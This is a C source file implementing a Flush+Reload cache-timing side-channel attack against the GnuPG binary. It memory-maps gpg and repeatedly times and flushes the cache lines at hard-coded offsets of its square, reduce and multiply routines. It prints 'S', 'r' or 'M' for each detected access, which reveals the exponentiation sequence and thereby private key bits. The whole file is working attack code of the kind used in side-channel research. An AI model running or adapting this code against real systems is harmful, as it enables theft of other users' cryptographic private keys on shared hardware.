#include "cacheutils.h"
#include <stdio.h>
#include <sched.h>
#include <unistd.h>
size_t sq = 0xB8FA5;
size_t rem = 0x8100257-0x08048000;
size_t mul = 0x8100944-0x08048000;
char *base;

#define MIN_CACHE_MISS_CYCLES (170)

size_t kpause = 0,count=0,count1=0;

void flushandreload(void* addr, char c)
{
  
  size_t time = rdtsc();
  maccess(addr);
  size_t delta = rdtsc() - time;
  flush(addr);
  if (delta < MIN_CACHE_MISS_CYCLES)
  {
    {
    if (kpause > 0)
	count ++;	
	//printf(" |-%ld-%ld-", count1,delta);
	(count1 = 0);
	printf("%c", c);
    }
    kpause = 0;
  }
  else
    kpause++;
}

int main(int argc, char *argv[]){
	int fd = open("../gnupg/g10/gpg", O_RDONLY);
	size_t size = lseek(fd, 0, SEEK_END);
	if(size == 0)
		exit(-1);
	size_t map_size = size; 
	base = (char *) mmap(0, map_size, PROT_READ, MAP_SHARED, fd, 0);
	while(1){
	flushandreload(base + sq, 'S');
	flushandreload(base + rem , 'r');
	flushandreload(base + mul, 'M');
	size_t time= rdtsc(), delta=0;
	while(delta < 400){
		delta = rdtsc()-time;
		}
	count1 ++;
  	}
}
